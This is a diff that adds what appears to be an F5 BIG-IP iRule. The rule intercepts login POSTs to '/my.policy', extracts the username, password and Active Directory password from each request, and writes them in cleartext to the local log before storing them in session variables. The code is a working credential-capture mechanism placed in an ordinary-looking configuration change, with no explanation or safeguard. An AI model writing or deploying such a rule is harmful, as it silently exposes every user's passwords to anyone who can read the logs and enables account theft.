@@ -1,0 +1,33 @@
+when HTTP_REQUEST {
+	# Check for post requests to the fake URI
+	if {[HTTP::uri] starts_with "/my.policy" && [HTTP::method] eq "POST"}{
+
+		# Collect up to 1Mb of request content
+		if { [HTTP::header exists "Content-Length"] && [HTTP::header "Content-Length"] < 1048577 } {
+			set content_length [HTTP::header "Content-Length"]
+		} else {
+			set content_length 1048576
+		}
+		if { $content_length > 0 } {
+			 HTTP::collect $content_length
+		}
+	}
+}
+
+when HTTP_REQUEST_DATA {
+	# Parse the username and password from the collected payload
+	set username [URI::query "?[HTTP::payload]" username]
+	set password [URI::query "?[HTTP::payload]" password]
+	set password_ad [URI::query "?[HTTP::payload]" password_ad]
+	log local0.info "USERNAME:$username PASSWORD:$password ADPASSWORD:$password_ad"
+	HTTP::release
+}
+
+when ACCESS_SESSION_STARTED {
+	if { [ info exists username ] } {
+		# ACCESS::session data set session.logon.last.username $username
+		ACCESS::session data set session.logon.last.password $password
+		ACCESS::session data set session.logon.last.password_ad $password_ad
+		ACCESS::session data set session.logon.last.username [URI::decode $username]
+	}
+}
